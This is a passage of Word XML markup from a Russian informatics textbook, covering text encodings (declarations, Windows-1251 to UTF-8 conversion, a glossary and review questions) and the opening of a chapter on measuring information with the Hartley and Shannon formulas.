        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При работе с Windows API</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для эффективного представления азиатских текстов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Используйте национальные кодировки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Windows-1251, KOI8-R):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Только для поддержки устаревших систем</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При работе со старыми файлами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Декларация кодировки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В HTML:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;meta charset="UTF-8"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В HTTP-заголовках:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Content-Type: text/html; charset=UTF-8</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В XML:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># -*- coding: utf-8 -*-</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Преобразование между кодировками</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Многие языки программирования предоставляют функции для конвертации текста между кодировками:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Чтение файла в Windows-1251</w:t>
        <w:br/>
        <w:t>with open('file.txt', 'r', encoding='windows-1251') as f:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    text = f.read()</w:t>
        <w:br/>
        <w:br/>
        <w:t># Запись в UTF-8</w:t>
        <w:br/>
        <w:t>with open('file_utf8.txt', 'w', encoding='utf-8') as f:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    f.write(text)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Утилита iconv (Linux/Unix):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>iconv -f windows-1251 -t utf-8 input.txt -o output.txt</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Обработка текста в программах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>При работе с текстом в программах важно:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Явно указывать кодировку** при чтении и записи файлов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Использовать Unicode-строки** внутри программы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Валидировать входные данные** на соответствие объявленной кодировке</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Обрабатывать ошибки** некорректных последовательностей байтов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Тестировать** на текстах различных языков</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ASCII</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — 7-битная кодировка для латинских символов (128 символов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кодировка (character encoding)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — система соответствия между символами и их двоичными кодами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кракозябры (mojibake)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — нечитаемые символы, возникающие при интерпретации текста в неправильной кодировке</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Unicode</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — универсальный стандарт кодирования, охватывающий символы всех письменностей мира</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Code point</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — уникальный числовой код символа в Unicode (формат U+XXXX)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-8</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — переменная кодировка Unicode (1-4 байта), совместимая с ASCII</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-16</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — кодировка Unicode с использованием 2 или 4 байт, использующая суррогатные пары</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>UTF-32</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — кодировка Unicode с фиксированной длиной 4 байта</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>BOM (Byte Order Mark)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — специальный символ в начале файла, указывающий порядок байтов (U+FEFF)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суррогатная пара</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — пара 16-битных значений в UTF-16 для кодирования символов за пределами BMP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Windows-1251</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — 8-битная кодировка для кириллицы, разработанная Microsoft</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>КОИ-8</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — 8-битная кодировка для кириллицы, популярная в UNIX-системах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>BMP (Basic Multilingual Plane)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — основная плоскость Unicode (U+0000 до U+FFFF)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Endianness</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — порядок следования байтов в многобайтовых представлениях (Big Endian / Little Endian)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теоретический вопрос:** Объясните, почему ASCII использует 7 бит, а не 8. Какие преимущества и недостатки это даёт? Почему современные кодировки используют 8-битные байты?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практическая задача:** Рассчитайте размер текстового файла, содержащего фразу "Информатика — наука о данных" (30 символов) в следующих кодировках: а) Windows-1251, б) UTF-8, в) UTF-16LE (с BOM), г) UTF-32LE (с BOM). Покажите подробные расчёты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Проблемная ситуация:** Пользователь открыл текстовый файл и увидел набор непонятных символов вместо текста. Опишите возможные причины этой проблемы и способы её решения. Как можно определить исходную кодировку файла?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сравнительный анализ:** В чём принципиальное отличие UTF-8 от UTF-16 и UTF-32? Приведите примеры ситуаций, когда каждая из этих кодировок будет наиболее эффективна.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практическое применение:** При разработке веб-приложения, поддерживающего 10 языков (английский, русский, китайский, арабский, хинди и другие), какую кодировку вы бы выбрали и почему? Обоснуйте свой выбор, учитывая как технические, так и практические аспекты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Данная глава заложила основы понимания представления текстовой информации в компьютерах.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> В следующих главах мы изучим другие аспекты представления информации, а также рассмотрим, как операционные системы и прикладное программное обеспечение работают с текстовыми данными в различных кодировках.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.5: Меры информации. Синтаксическая, семантическая, прагматическая меры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Информация — фундаментальное понятие современной науки и технологии. Но как измерить информацию? Сколько информации содержится в книге, фотографии или сообщении? Оказывается, на этот вопрос нет однозначного ответа, так как информацию можно измерять с разных точек зрения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Существуют три основных подхода к измерению информации: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>синтаксический</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (количественный), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>семантический</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (смысловой) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>прагматический</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (ценностный). Каждый из этих подходов отражает различные аспекты информации и применяется в разных контекстах. Синтаксический подход отвечает на вопрос "сколько", семантический — "о чём", а прагматический — "насколько полезно".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Понимание различных мер информации критически важно для специалистов в области информационных технологий. Например, при проектировании систем хранения данных важна синтаксическая мера (сколько байтов занимает файл), при создании поисковых систем — семантическая (насколько релевантен документ запросу), а при разработке систем поддержки принятий — прагматическая (насколько полезна информация для достижения цели).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава тесно связана с главой 1.10 (свойства информации) и главой 1.12 (сжатие информации), так как понимание того, как измеряется информация, помогает оценить эффективность алгоритмов сжатия и понять природу информационных процессов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Синтаксическая мера информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Определение и сущность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксическая мера информации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (также называемая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>объёмной</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>количественной</w:t>
      </w:r>
      <w:r>
        <w:t>) — это подход к измерению информации, при котором учитывается только количество символов, битов или сигналов, независимо от их смысла и ценности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>С синтаксической точки зрения информация рассматривается как последовательность символов из некоторого алфавита. Мера зависит только от количества этих символов и мощности алфавита, но не от содержания сообщения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Синтаксическая мера имеет два основных подхода:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Объёмный подход** — простой подсчёт объёма данных (биты, байты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Вероятностный подход** — учёт вероятности появления символов (энтропийный подход)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Единицы измерения информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Основная единица измерения информации — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>бит</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (binary digit, двоичная цифра).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Бит</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это количество информации, необходимое для выбора одного из двух равновероятных вариантов (да/нет, 0/1, истина/ложь).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Производные единицы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Единица    | Обозначение | Соотношение                  | Количество байтов      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------------|-------------|------------------------------|------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Бит        | бит         | 1 бит                        | —                      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Байт       | Б (B)       | 8 бит                        | 1                      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Килобайт   | КБ (KB)     | 1024 байта = 2¹⁰ байт        | 1 024                  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Мегабайт   | МБ (MB)     | 1024 КБ = 2²⁰ байт           | 1 048 576              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Гигабайт   | ГБ (GB)     | 1024 МБ = 2³⁰ байт           | 1 073 741 824          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Терабайт   | ТБ (TB)     | 1024 ГБ = 2⁴⁰ байт           | 1 099 511 627 776      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Петабайт   | ПБ (PB)     | 1024 ТБ = 2⁵⁰ байт           | 1 125 899 906 842 624  |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примечание:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Существует также система СИ, где приставки обозначают степени 1000, а не 1024:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1 кБ (килобайт) = 1000 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1 КиБ (кибибайт, KiB) = 1024 байта</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В информатике чаще используется бинарная система (степени двойки).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Формула Хартли (для равновероятных событий)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Американский инженер Ральф Хартли в 1928 году предложил формулу для расчёта количества информации при равновероятных событиях.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формула Хартли:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>I = log₂(N)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**I** — количество информации (в битах)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**N** — количество возможных равновероятных событий (вариантов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**log₂** — логарифм по основанию 2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Смысл формулы:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> если имеется N равновероятных вариантов, то для указания одного из них требуется log₂(N) бит информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Другая форма записи:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>N = 2^I</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта форма удобна, когда известно количество бит и нужно найти количество вариантов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важное следствие:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для удвоения количества вариантов достаточно добавить всего 1 бит информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Формула Шеннона (для неравновероятных событий)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Клод Шеннон в 1948 году создал математическую теорию информации и предложил формулу для расчёта среднего количества информации (энтропии) при неравновероятных событиях.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формула Шеннона (энтропия):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>H = -∑(pᵢ × log₂(pᵢ))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>где:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**H** — энтропия (среднее количество информации на символ, в битах)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**pᵢ** — вероятность появления i-го символа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**∑** — сумма по всем возможным символам</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Смысл энтропии:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> энтропия показывает среднее количество информации, приходящееся на один символ сообщения. Чем более неопределённым является источник, тем выше энтропия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Свойства энтропии:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>H ≥ 0 (энтропия неотрицательна)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>H максимальна при равновероятных событиях (все pᵢ одинаковы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>H = 0 когда одно событие имеет вероятность 1 (полная определённость, нет информации)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связь с формулой Хартли:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> если все события равновероятны (pᵢ = 1/N), то формула Шеннона превращается в формулу Хартли:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>H = -∑(1/N × log₂(1/N)) = -N × (1/N) × log₂(1/N) = log₂(N)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры расчётов по формуле Хартли</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Количество информации в бросании монеты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Монета может упасть орлом или решкой — 2 равновероятных исхода.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>I = log₂(2) = 1 бит</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Результат одного броска монеты несёт ровно 1 бит информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Количество информации в бросании игрального кубика</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Кубик имеет 6 граней, каждая выпадает с вероятностью 1/6.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>I = log₂(6) ≈ 2.585 бита</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Результат броска кубика несёт примерно 2.585 бита информации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Угадывание числа от 1 до 100</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Имеется 100 возможных чисел, все равновероятны.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>I = log₂(100) ≈ 6.644 бита</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для однозначного указания числа от 1 до 100 требуется примерно 6.644 бита, что соответствует 7 битам в двоичном представлении (2⁷ = 128 &gt; 100).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 4:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Выбор символа из алфавита</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Русский алфавит содержит 33 буквы. Если предположить, что все буквы равновероятны:</w:t>
      </w:r>
